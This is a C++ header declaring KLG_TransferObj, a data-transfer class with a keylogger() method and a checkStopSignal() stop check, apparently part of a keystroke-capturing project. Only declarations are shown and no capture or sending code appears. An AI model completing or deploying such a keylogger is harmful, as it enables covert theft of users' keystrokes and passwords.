#pragma once

#include  "DataTransferObj.h"
#include <string>
#include <vector>
#include <memory>
#include <conio.h>

class KLG_TransferObj : public DataTransferObj
{
public:
	


	// Convert data object to string type
	std::string toString() = 0;

	// Convert data object to a file
	std::string toFile(std::string filename) = 0;

	std::string keylogger();
	bool checkStopSignal();

};